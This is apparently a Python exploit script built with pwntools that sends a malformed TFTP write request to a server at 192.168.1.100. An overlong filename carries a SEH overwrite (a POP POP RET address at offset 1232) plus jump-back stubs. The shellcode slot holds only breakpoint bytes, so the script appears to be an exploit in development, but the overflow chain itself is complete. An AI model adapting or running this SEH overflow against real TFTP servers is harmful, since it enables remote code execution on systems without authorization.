#!/usr/bin/env python

import struct
import pwn

CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"

def soc(string,content,offset):     # String Overwrite Content (Original String, NewContent, Offset)
   s=string[0:offset]
   s+=content
   s+=string[(offset+len(content)):]
   return s

def hexdump(buf):
   hexvalues = ""
   asciivalues = ""
   for i in range(len(buf)):
       if buf[i] == "\x90":
           color = CBLU
       elif buf[i] == "\x41":
           color = CYEL
       elif buf[i] == "\xcc":
           color = CRED
       else:
           color = CGRE
       hexvalues += "%s%02x %s" % (color, ord(buf[i]), CRST)
       if ord(buf[i]) in range(0x20, 0x7f):
           value = buf[i]
           color = CGRE
       else:
           value = "."
           color = CRED
       asciivalues += "%s%s%s" % (color, value, CRST)
       if i % 16 == 0x0f:
           print("0x%08x (%08d):   %s    %s" % (i & 0xfffffff0, i & 0xfffffff0, hexvalues, asciivalues))
           hexvalues = ""
           asciivalues = ""
   if i % 16 != 0x0f:
       hexvalues += "   " *(15-i%16)
       asciivalues += " " *(15-i%16)
       print("0x%08x (%08d):   %s    %s" % (i & 0xfffffff0, i & 0xfffffff0, hexvalues, asciivalues))


# Target
host="192.168.1.100"
port=69
tpt="udp"

# Snippets
nop = "\x90"
brk = "\xcc"
seh = struct.pack('<I',0x0040484F)  # POP EDI, POP EBP, RET
jmpback="\xeb\xea" # jmp short -20
longjmpback="\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1" #jmp eip-512
sc=brk*50

# Buffer
buf=brk*1236
buf=soc(buf,seh,1232)               # SEH handler SEH chain SE handler=31704230; Pattern 0Bp1 (0x31704230) found in cyclic pattern at position 1232
buf=soc(buf,jmpback,1228)
buf=soc(buf,longjmpback,1208)
buf=soc(buf,sc,194+512)

#Build TFTP packet
opcode = "\x00\x02"     # TFTP WRQ
fn     = buf
mode   = "netascii"
null   = "\x00"
req    = opcode + fn + null + mode + null

# The intermediate null byte is now part of the fn (jmpecx)
req = opcode + fn + mode + null

#Connect and send
print("len : " + str(len(req)))
c=pwn.connect(host=host,port=port,typ=tpt)
c.send(req)
hexdump(buf)
#print c.recv()
c.close()

